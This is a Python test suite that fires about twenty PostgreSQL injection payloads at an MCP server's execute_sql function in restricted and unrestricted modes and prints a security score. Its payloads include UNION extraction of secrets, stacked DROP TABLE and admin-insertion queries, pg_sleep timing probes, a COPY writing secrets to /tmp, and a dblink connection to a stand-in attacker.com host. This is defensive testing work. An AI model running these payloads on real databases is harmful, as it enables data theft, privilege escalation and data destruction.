#!/usr/bin/env python3
"""
Comprehensive SQL Injection Security Test Suite for Postgres MCP Server
========================================================================

This test suite validates the security posture of the Postgres MCP server
against various SQL injection attack vectors, similar to the comprehensive
testing performed on the SQLite MCP server.

CRITICAL FINDINGS:
- Unrestricted mode is vulnerable to SQL injection attacks
- The execute_sql function directly passes user input without parameter binding
- This is the same vulnerability found in the original Anthropic SQLite MCP server

Test Categories:
1. Basic SQL Injection (UNION, stacked queries)
2. Blind SQL Injection (time-based, boolean-based)
3. Error-based SQL Injection
4. Advanced techniques (comment injection, encoding)
5. PostgreSQL-specific attacks (system functions, extensions)
6. Parameter binding validation
7. Restricted vs Unrestricted mode comparison

Author: Enhanced by neverinfamous (based on SQLite MCP security research)
Date: September 28, 2025
"""

import asyncio
import logging
import os
import sys
import time
from dataclasses import dataclass
from enum import Enum
from typing import Any
from typing import Dict
from typing import List
from typing import Optional
from typing import TypedDict
from typing import cast

# Fix Windows event loop compatibility with psycopg3
if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

# Add the src directory to the path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from mcp import types

from postgres_mcp.sql import DbConnPool
from postgres_mcp.sql import SqlDriver


class AttackVector(Enum):
    """Types of SQL injection attack vectors"""

    UNION_BASED = "union_based"
    STACKED_QUERIES = "stacked_queries"
    BLIND_BOOLEAN = "blind_boolean"
    BLIND_TIME = "blind_time"
    ERROR_BASED = "error_based"
    COMMENT_INJECTION = "comment_injection"
    ENCODING_BYPASS = "encoding_bypass"
    POSTGRES_SPECIFIC = "postgres_specific"
    PARAMETER_POLLUTION = "parameter_pollution"


class SecurityLevel(Enum):
    """Security risk levels"""

    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class InjectionTest:
    """Represents a single SQL injection test case"""

    name: str
    attack_vector: AttackVector
    payload: str
    expected_vulnerable: bool  # True if this should be vulnerable in unrestricted mode
    security_level: SecurityLevel
    description: str
    postgres_specific: bool = False


@dataclass
class TestResult:
    """Results of a SQL injection test"""

    test: InjectionTest
    vulnerable: bool
    error_message: Optional[str]
    execution_time: float
    mode_tested: str


class VulnerabilitySummary(TypedDict):
    """Summary of vulnerabilities by severity"""

    critical: int
    high: int
    medium: int


class ModeSummary(TypedDict):
    """Summary of test results for a specific mode"""

    total_tests: int
    vulnerable: int
    protected: int
    security_score: float
    vulnerabilities_by_severity: VulnerabilitySummary


class Recommendation(TypedDict):
    """Security recommendation"""

    priority: str
    issue: str
    description: str
    solution: str


class SecurityReport(TypedDict):
    """Complete security report structure"""

    summary: Dict[str, ModeSummary]
    detailed_results: Dict[str, List[TestResult]]
    recommendations: List[Recommendation]
    security_score: float


class PostgresSQLInjectionTester:
    """Comprehensive SQL injection security tester for Postgres MCP Server"""

    def __init__(self, connection_url: str):
        self.connection_url = connection_url
        self.db_pool = DbConnPool(connection_url)
        self.results: List[TestResult] = []
        self.setup_complete = False

        # Configure logging
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)

        # Suppress SQL driver error logs during testing to keep output clean
        sql_logger = logging.getLogger("postgres_mcp.sql.sql_driver")
        sql_logger.setLevel(logging.CRITICAL)
        safe_sql_logger = logging.getLogger("postgres_mcp.sql.safe_sql")
        safe_sql_logger.setLevel(logging.CRITICAL)

    async def setup_test_environment(self):
        """Set up test database and tables"""
        if self.setup_complete:
            return

        try:
            # Initialize connection pool
            await self.db_pool.pool_connect()

            # Create test tables for injection testing
            sql_driver = SqlDriver(conn=self.db_pool)

            # Create a test table with sample data (explicitly allow writes)
            await sql_driver.execute_query(
                """
                DROP TABLE IF EXISTS test_users CASCADE;
                CREATE TABLE test_users (
                    id SERIAL PRIMARY KEY,
                    username VARCHAR(50) NOT NULL,
                    email VARCHAR(100),
                    password_hash VARCHAR(255),
                    is_admin BOOLEAN DEFAULT FALSE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            """,
                force_readonly=False,
            )

            # Insert test data
            await sql_driver.execute_query(
                """
                INSERT INTO test_users (username, email, password_hash, is_admin) VALUES
                ('admin', 'admin@test.com', 'hash123', TRUE),
                ('user1', 'user1@test.com', 'hash456', FALSE),
                ('user2', 'user2@test.com', 'hash789', FALSE),
                ('test_user', 'test@example.com', 'testhash', FALSE);
            """,
                force_readonly=False,
            )

            # Create a sensitive table
            await sql_driver.execute_query(
                """
                DROP TABLE IF EXISTS sensitive_data CASCADE;
                CREATE TABLE sensitive_data (
                    id SERIAL PRIMARY KEY,
                    secret_key VARCHAR(255),
                    api_token VARCHAR(255),
                    confidential_info TEXT
                );
            """,
                force_readonly=False,
            )

            await sql_driver.execute_query(
                """
                INSERT INTO sensitive_data (secret_key, api_token, confidential_info) VALUES
                ('super_secret_key_123', 'api_token_xyz789', 'This is confidential information'),
                ('another_secret', 'token_abc123', 'More sensitive data here');
            """,
                force_readonly=False,
            )

            # Ensure all setup operations are committed by closing and reopening connection
            # This forces PostgreSQL to commit any pending transactions
            await self.db_pool.close()
            await self.db_pool.pool_connect()

            # Create a fresh driver for verification to ensure we see committed data
            verification_driver = SqlDriver(conn=self.db_pool)

            # Verify tables were created successfully
            verification_result = await verification_driver.execute_query("SELECT COUNT(*) FROM test_users", force_readonly=True)
            if verification_result and len(verification_result) > 0:
                user_count = next(iter(verification_result[0].cells.values()))
                self.logger.info(f"Test environment setup complete - {user_count} test users created")

                # Also verify sensitive_data table
                sensitive_result = await verification_driver.execute_query("SELECT COUNT(*) FROM sensitive_data", force_readonly=True)
                if sensitive_result and len(sensitive_result) > 0:
                    sensitive_count = next(iter(sensitive_result[0].cells.values()))
                    self.logger.info(f"Sensitive data table verified - {sensitive_count} records")
                else:
                    raise Exception("Failed to verify sensitive_data table creation")
            else:
                raise Exception("Failed to verify test table creation")

            self.setup_complete = True

        except Exception as e:
            if "password authentication failed" in str(e) or "connection failed" in str(e):
                self.logger.error(f"❌ Database connection failed: {e}")
                self.logger.error("🔍 Check your DATABASE_URL environment variable")
                self.logger.error("💡 For Docker containers, use: host.docker.internal instead of localhost")
            else:
                self.logger.error(f"❌ Failed to setup test environment: {e}")
            raise

    def get_injection_test_cases(self) -> List[InjectionTest]:
        """Generate comprehensive SQL injection test cases"""

        tests = [
            # 1. UNION-based SQL Injection
            InjectionTest(
                name="UNION SELECT - Extract sensitive data",
                attack_vector=AttackVector.UNION_BASED,
                payload="1' UNION SELECT 999, secret_key, api_token, confidential_info, FALSE, NOW() FROM sensitive_data--",
                expected_vulnerable=True,
                security_level=SecurityLevel.CRITICAL,
                description="Attempts to extract sensitive data using UNION SELECT",
            ),
            InjectionTest(
                name="UNION SELECT - Database version disclosure",
                attack_vector=AttackVector.UNION_BASED,
                payload="1' UNION SELECT 998, version(), current_user, current_database(), FALSE, NOW()--",
                expected_vulnerable=True,
                security_level=SecurityLevel.HIGH,
                description="Extracts PostgreSQL version and database information",
                postgres_specific=True,
            ),
            # 2. Stacked Queries (Multiple statements)
            InjectionTest(
                name="Stacked Query - Create malicious user",
                attack_vector=AttackVector.STACKED_QUERIES,
                payload="1'; INSERT INTO test_users (username, email, is_admin) VALUES ('hacker', 'hacker@evil.com', TRUE);--",
                expected_vulnerable=True,
                security_level=SecurityLevel.CRITICAL,
                description="Attempts to create a new admin user via stacked query",
            ),
            InjectionTest(
                name="Stacked Query - Drop table",
                attack_vector=AttackVector.STACKED_QUERIES,
                payload="1'; DROP TABLE test_users;--",
                expected_vulnerable=True,
                security_level=SecurityLevel.CRITICAL,
                description="Attempts to drop the test_users table",
            ),
            InjectionTest(
                name="Stacked Query - Update admin privileges",
                attack_vector=AttackVector.STACKED_QUERIES,
                payload="1'; UPDATE test_users SET is_admin = TRUE WHERE username = 'user1';--",
                expected_vulnerable=True,
                security_level=SecurityLevel.CRITICAL,
                description="Attempts to escalate user privileges",
            ),
            # 3. Blind Boolean-based SQL Injection
            InjectionTest(
                name="Blind Boolean - Admin user check",
                attack_vector=AttackVector.BLIND_BOOLEAN,
                payload="1' AND (SELECT COUNT(*) FROM test_users WHERE is_admin = TRUE) > 0--",
                expected_vulnerable=True,
                security_level=SecurityLevel.HIGH,
                description="Boolean-based blind injection to check for admin users",
            ),
            InjectionTest(
                name="Blind Boolean - Password extraction",
                attack_vector=AttackVector.BLIND_BOOLEAN,
                payload="1' AND (SELECT SUBSTRING(password_hash, 1, 1) FROM test_users WHERE username = 'admin') = 'h'--",
                expected_vulnerable=True,
                security_level=SecurityLevel.HIGH,
                description="Attempts to extract password hash character by character",
            ),
            # 4. Time-based Blind SQL Injection
            InjectionTest(
                name="Time-based Blind - pg_sleep injection",
                attack_vector=AttackVector.BLIND_TIME,
                payload=(
                    "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM test_users WHERE is_admin = TRUE) > 0 "
                    "THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NOT NULL--"
                ),
                expected_vulnerable=True,
                security_level=SecurityLevel.HIGH,
                description="Time-based blind injection using pg_sleep",
                postgres_specific=True,
            ),
            # 5. Error-based SQL Injection
            InjectionTest(
                name="Error-based - Cast error information disclosure",
                attack_vector=AttackVector.ERROR_BASED,
                payload="1' AND CAST((SELECT secret_key FROM sensitive_data LIMIT 1) AS INTEGER) > 0--",
                expected_vulnerable=True,
                security_level=SecurityLevel.HIGH,
                description="Attempts to extract data through PostgreSQL cast errors",
            ),
            InjectionTest(
                name="Error-based - Division by zero injection",
                attack_vector=AttackVector.ERROR_BASED,
                payload="1' AND (SELECT CASE WHEN LENGTH(secret_key) > 10 THEN 1 ELSE 1/0 END FROM sensitive_data LIMIT 1) = 1--",
                expected_vulnerable=True,
                security_level=SecurityLevel.MEDIUM,
                description="PostgreSQL-compatible error-based injection using division by zero",
            ),
            # 6. Comment Injection and Bypass Techniques
            InjectionTest(
                name="Comment Bypass - Multiple comment styles",
                attack_vector=AttackVector.COMMENT_INJECTION,
                payload="1'/**/UNION/**/SELECT/**/997,/**/secret_key,/**/api_token,/**/confidential_info,/**/FALSE,/**/NOW()/**/FROM/**/sensitive_data--",
                expected_vulnerable=True,
                security_level=SecurityLevel.MEDIUM,
                description="Uses comment-based obfuscation to bypass basic filters",
            ),
            InjectionTest(
                name="Comment Bypass - Nested comments",
                attack_vector=AttackVector.COMMENT_INJECTION,
                payload=(
                    "1' /* comment */ UNION /* another comment */ SELECT 996, secret_key, api_token, "
                    "confidential_info, FALSE, NOW() FROM sensitive_data--"
                ),
                expected_vulnerable=True,
                security_level=SecurityLevel.MEDIUM,
                description="Nested comment injection technique",
            ),
            # 7. Encoding and Obfuscation
            InjectionTest(
                name="Encoding Bypass - Unicode normalization",
                attack_vector=AttackVector.ENCODING_BYPASS,
                payload="1' OR '1'='1'--",
                expected_vulnerable=True,
                security_level=SecurityLevel.MEDIUM,
                description="Unicode character substitution bypass",
            ),
            # 8. PostgreSQL-specific Attacks
            InjectionTest(
                name="PostgreSQL - System function access",
                attack_vector=AttackVector.POSTGRES_SPECIFIC,
                payload="1'; SELECT * FROM pg_user;--",
                expected_vulnerable=True,
                security_level=SecurityLevel.HIGH,
                description="Accesses PostgreSQL system catalogs for user information",
                postgres_specific=True,
            ),
            InjectionTest(
                name="PostgreSQL - File system access",
                attack_vector=AttackVector.POSTGRES_SPECIFIC,
                payload="1'; COPY (SELECT secret_key FROM sensitive_data) TO '/tmp/extracted_data.txt';--",
                expected_vulnerable=True,
                security_level=SecurityLevel.CRITICAL,
                description="Attempts to write sensitive data to file system",
                postgres_specific=True,
            ),
            InjectionTest(
                name="PostgreSQL - Extension exploitation",
                attack_vector=AttackVector.POSTGRES_SPECIFIC,
                payload="1'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host=attacker.com user=postgres');--",
                expected_vulnerable=True,
                security_level=SecurityLevel.CRITICAL,
                description="Attempts to create network connections via dblink",
                postgres_specific=True,
            ),
            InjectionTest(
                name="PostgreSQL - Large object manipulation",
                attack_vector=AttackVector.POSTGRES_SPECIFIC,
                payload=("1'; SELECT lo_create(12345); SELECT lo_put(12345, 0, (SELECT secret_key FROM sensitive_data LIMIT 1)::bytea);--"),
                expected_vulnerable=True,
                security_level=SecurityLevel.HIGH,
                description="Large object manipulation for data exfiltration",
                postgres_specific=True,
            ),
            # 9. Advanced Bypass Techniques
            InjectionTest(
                name="Advanced - Function call obfuscation",
                attack_vector=AttackVector.PARAMETER_POLLUTION,
                payload=(
                    "1' UNION SELECT 994, CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78), "
                    "secret_key, confidential_info, FALSE, NOW() FROM sensitive_data--"
                ),
                expected_vulnerable=True,
                security_level=SecurityLevel.MEDIUM,
                description="Uses CHR() function to obfuscate string literals",
            ),
            InjectionTest(
                name="Advanced - Conditional logic bypass",
                attack_vector=AttackVector.PARAMETER_POLLUTION,
                payload="1' OR 1=1 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)=1--",
                expected_vulnerable=True,
                security_level=SecurityLevel.MEDIUM,
                description="Complex conditional logic to bypass simple filters",
            ),
            # 10. Parameter Binding Tests (These should be SAFE)
            InjectionTest(
                name="Parameter Binding - Should be safe",
                attack_vector=AttackVector.PARAMETER_POLLUTION,
                payload="999'; DROP TABLE test_users;--",
                expected_vulnerable=False,  # Should be safe with proper parameter binding
                security_level=SecurityLevel.INFO,
                description="Tests if parameter binding prevents basic injection",
            ),
        ]

        return tests

    async def test_sql_injection(self, test: InjectionTest, mode: str = "unrestricted") -> TestResult:
        """Test a single SQL injection payload"""

        start_time = time.time()
        vulnerable = False
        error_message = None

        try:
            # Ensure test environment is set up
            if not self.setup_complete:
                await self.setup_test_environment()

            # Set up the appropriate driver based on mode
            # Set up the appropriate SQL driver based on mode
            # (Note: We now test the MCP server function directly instead of the driver)

            # Skip table existence check - it causes transaction isolation noise
            # but doesn't affect the actual test validity. Tests work fine without it.

            # Test the actual MCP server execute_sql function
            # Import the server module to test the actual MCP function
            import postgres_mcp.server as server_module
            from postgres_mcp.server import AccessMode
            from postgres_mcp.server import execute_sql

            # Set up the server's database connection and access mode
            await server_module.db_connection.pool_connect(self.connection_url)
            if mode == "restricted":
                server_module.current_access_mode = AccessMode.RESTRICTED
            else:
                server_module.current_access_mode = AccessMode.UNRESTRICTED

            # Construct a vulnerable query (simulating what a malicious user would send)
            # The payloads are designed to be injected into a quoted string context
            vulnerable_query = f"SELECT * FROM test_users WHERE id = '{test.payload}'"

            # Test the actual MCP server execute_sql function
            # This tests the real security implementation
            mcp_result = await execute_sql(sql=vulnerable_query)

            # Convert MCP result to the format expected by the test
            if mcp_result and len(mcp_result) > 0 and isinstance(mcp_result[0], types.TextContent) and mcp_result[0].text:
                # Check if it's an error message (security blocked)
                if "error:" in mcp_result[0].text.lower() and "injection detected" in mcp_result[0].text.lower():
                    # Security validation blocked the query - treat as no result (protected)
                    result = None
                else:
                    # Parse the result text to extract data
                    import ast

                    try:
                        result_list: Any = ast.literal_eval(mcp_result[0].text)
                        if isinstance(result_list, list):
                            # Convert to RowResult format for compatibility
                            class RowResult:
                                def __init__(self, cells: Dict[str, Any]):
                                    self.cells = cells

                            # Filter and convert rows with proper typing
                            # Suppress type checking for dynamic parsing result
                            typed_rows: List[Dict[str, Any]] = []
                            for item in result_list:  # type: ignore[has-type]
                                if isinstance(item, dict):
                                    typed_rows.append(cast(Dict[str, Any], item))
                            result = [RowResult(row) for row in typed_rows]
                        else:
                            result = None
                    except Exception:
                        # If parsing fails, assume it's an error or no data
                        result = None
            else:
                result = None

            # If we get here without exception, check if the injection was successful
            if result is not None:
                # Check for signs of successful injection
                result_data = [dict(row.cells) for row in result] if result else []

                # Look for evidence of successful injection
                if test.attack_vector == AttackVector.UNION_BASED:
                    # Check if we got more columns than expected or sensitive data
                    if len(result_data) > 4 or any("secret" in str(row).lower() for row in result_data):
                        vulnerable = True

                elif test.attack_vector == AttackVector.STACKED_QUERIES:
                    # For stacked queries, we need to check if the malicious action occurred
                    # This is harder to detect automatically, so we assume success if no error
                    vulnerable = True

                elif test.attack_vector in [AttackVector.BLIND_BOOLEAN, AttackVector.ERROR_BASED]:
                    # These might succeed without obvious signs
                    vulnerable = True

                elif test.attack_vector == AttackVector.BLIND_TIME:
                    # Check if execution took significantly longer (indicating pg_sleep worked)
                    execution_time = time.time() - start_time
                    if execution_time > 2.5:  # Allow some margin for pg_sleep(3)
                        vulnerable = True

        except Exception as e:
            error_message = str(e)

            # Classify errors to determine if they indicate protection or vulnerability
            protection_indicators = [
                "cannot execute",  # Read-only transaction protection
                "read-only transaction",  # Read-only protection
                "union types",  # PostgreSQL type system protection
                "cannot be matched",  # Type mismatch protection
                "must be type boolean",  # Type validation protection
                "does not exist",  # Function/feature doesn't exist (protection)
                "same number of columns",  # SQL structure validation
                "invalid input syntax",  # Input validation protection
                "injection detected",  # Our new MCP server security validation
                "parameter binding",  # Parameter binding requirement message
            ]

            vulnerability_indicators = [
                "relation",  # Table access issues might indicate injection worked
                "syntax error at or near",  # Malformed SQL from injection
            ]

            # Check if this error indicates protection working
            if any(indicator in error_message.lower() for indicator in protection_indicators):
                vulnerable = False
            # Check if this error indicates a successful injection attempt
            elif any(indicator in error_message.lower() for indicator in vulnerability_indicators):
                vulnerable = True
            else:
                # Default: in restricted mode, errors usually mean protection
                # In unrestricted mode, errors might indicate successful injection
                vulnerable = mode != "restricted"

        execution_time = time.time() - start_time

        return TestResult(test=test, vulnerable=vulnerable, error_message=error_message, execution_time=execution_time, mode_tested=mode)

    async def run_comprehensive_test_suite(self) -> SecurityReport:
        """Run the complete SQL injection test suite"""

        self.logger.info("Starting Comprehensive SQL Injection Security Test Suite")
        self.logger.info("=" * 80)

        await self.setup_test_environment()

        test_cases = self.get_injection_test_cases()

        # Test both unrestricted and restricted modes
        modes_to_test = ["unrestricted", "restricted"]

        all_results: Dict[str, List[TestResult]] = {}

        for mode in modes_to_test:
            self.logger.info(f"\nTesting {mode.upper()} mode...")
            self.logger.info("-" * 50)

            mode_results: List[TestResult] = []

            for i, test in enumerate(test_cases, 1):
                self.logger.info(f"[{i:2d}/{len(test_cases)}] {test.name}")

                try:
                    result = await self.test_sql_injection(test, mode)
                    mode_results.append(result)

                    # Log result
                    status = "VULNERABLE" if result.vulnerable else "PROTECTED"
                    self.logger.info(f"    {status} ({result.execution_time:.3f}s)")

                    if result.error_message and len(result.error_message) < 100:
                        self.logger.info(f"    Error: {result.error_message}")

                except Exception as e:
                    self.logger.error(f"    Test failed: {e}")

            all_results[mode] = mode_results

        # Generate comprehensive report
        report = self.generate_security_report(all_results)

        return report

    def generate_security_report(self, results: Dict[str, List[TestResult]]) -> SecurityReport:
        """Generate a comprehensive security report"""

        report: SecurityReport = {"summary": {}, "detailed_results": results, "recommendations": [], "security_score": 0.0}

        for mode, mode_results in results.items():
            total_tests = len(mode_results)
            vulnerable_tests = sum(1 for r in mode_results if r.vulnerable)
            protected_tests = total_tests - vulnerable_tests

            # Calculate security score (0-100, higher is better)
            security_score = (protected_tests / total_tests) * 100 if total_tests > 0 else 0

            # Categorize vulnerabilities by severity
            critical_vulns = sum(1 for r in mode_results if r.vulnerable and r.test.security_level == SecurityLevel.CRITICAL)
            high_vulns = sum(1 for r in mode_results if r.vulnerable and r.test.security_level == SecurityLevel.HIGH)
            medium_vulns = sum(1 for r in mode_results if r.vulnerable and r.test.security_level == SecurityLevel.MEDIUM)

            report["summary"][mode] = {
                "total_tests": total_tests,
                "vulnerable": vulnerable_tests,
                "protected": protected_tests,
                "security_score": security_score,
                "vulnerabilities_by_severity": {"critical": critical_vulns, "high": high_vulns, "medium": medium_vulns},
            }

        # Generate recommendations
        unrestricted_results = results.get("unrestricted", [])
        restricted_results = results.get("restricted", [])

        if unrestricted_results:
            unrestricted_vulns = sum(1 for r in unrestricted_results if r.vulnerable)
            if unrestricted_vulns > 0:
                report["recommendations"].append(
                    {
                        "priority": "CRITICAL",
                        "issue": "SQL Injection Vulnerability in Unrestricted Mode",
                        "description": f"Found {unrestricted_vulns} successful SQL injection attacks in unrestricted mode",
                        "solution": "Implement parameter binding in execute_sql function, similar to SQLite MCP server fix",
                    }
                )

        if restricted_results:
            restricted_vulns = sum(1 for r in restricted_results if r.vulnerable)
            if restricted_vulns == 0:
                report["recommendations"].append(
                    {
                        "priority": "INFO",
                        "issue": "Restricted Mode Security",
                        "description": "Restricted mode successfully blocked all injection attempts",
                        "solution": "Consider making restricted mode the default for production use",
                    }
                )

        # Overall security score (average of both modes, weighted toward unrestricted)
        if "unrestricted" in report["summary"] and "restricted" in report["summary"]:
            unrestricted_score = report["summary"]["unrestricted"]["security_score"]
            restricted_score = report["summary"]["restricted"]["security_score"]
            # Weight unrestricted mode more heavily since it's the default
            report["security_score"] = unrestricted_score * 0.7 + restricted_score * 0.3

        return report

    def print_security_report(self, report: SecurityReport):
        """Print a formatted security report"""

        print("\n" + "=" * 80)
        print("🛡️  POSTGRES MCP SERVER SECURITY ASSESSMENT REPORT")
        print("=" * 80)

        # Overall security score
        score = report["security_score"]
        if score >= 90:
            score_status = "🟢 EXCELLENT"
        elif score >= 70:
            score_status = "🟡 GOOD"
        elif score >= 50:
            score_status = "🟠 FAIR"
        else:
            score_status = "🔴 POOR"

        print(f"\n📊 Overall Security Score: {score:.1f}/100 {score_status}")

        # Mode-specific results
        for mode, summary in report["summary"].items():
            print(f"\n🔍 {mode.upper()} MODE RESULTS:")
            print(f"   Total Tests: {summary['total_tests']}")
            print(f"   Vulnerable: {summary['vulnerable']} 🔴")
            print(f"   Protected:  {summary['protected']} 🟢")
            print(f"   Security Score: {summary['security_score']:.1f}/100")

            vulns = summary["vulnerabilities_by_severity"]
            if vulns["critical"] > 0:
                print(f"   🚨 Critical Vulnerabilities: {vulns['critical']}")
            if vulns["high"] > 0:
                print(f"   ⚠️  High Vulnerabilities: {vulns['high']}")
            if vulns["medium"] > 0:
                print(f"   ⚡ Medium Vulnerabilities: {vulns['medium']}")

        # Recommendations
        if report["recommendations"]:
            print("\n💡 SECURITY RECOMMENDATIONS:")
            for i, rec in enumerate(report["recommendations"], 1):
                priority_emoji = {"CRITICAL": "🚨", "HIGH": "⚠️", "MEDIUM": "⚡", "INFO": "i"}
                emoji = priority_emoji.get(rec["priority"], "📝")
                print(f"\n   {i}. {emoji} {rec['priority']}: {rec['issue']}")
                print(f"      Description: {rec['description']}")
                print(f"      Solution: {rec['solution']}")

        print("\n" + "=" * 80)


async def main():
    """Main function to run the security test suite"""

    # Database connection URL - modify as needed for your test environment
    # This should point to a test database, NOT production!
    connection_url = os.environ.get("TEST_DATABASE_URL", "postgresql://postgres:postgres@host.docker.internal:5432/postgres")

    print("🔐 Postgres MCP Server SQL Injection Security Test Suite")
    print("=" * 60)
    print(f"📍 Testing against: {connection_url.split('@')[1] if '@' in connection_url else 'localhost'}")
    print("⚠️  WARNING: This will create and modify test tables!")
    print("   Only run against a dedicated test database.")

    # Confirm before proceeding
    if not os.environ.get("SKIP_CONFIRMATION"):
        response = input("\n🤔 Continue with security testing? (y/N): ")
        if response.lower() != "y":
            print("❌ Testing cancelled.")
            return

    try:
        # Initialize and run the security tester
        tester = PostgresSQLInjectionTester(connection_url)
        report = await tester.run_comprehensive_test_suite()

        # Print the detailed report
        tester.print_security_report(report)

        # Return appropriate exit code based on security findings
        if report["security_score"] < 70:
            print("\n🚨 SECURITY ALERT: Critical vulnerabilities found!")
            sys.exit(1)
        else:
            print("\n✅ Security assessment completed.")
            sys.exit(0)

    except Exception as e:
        print(f"\n❌ Security testing failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
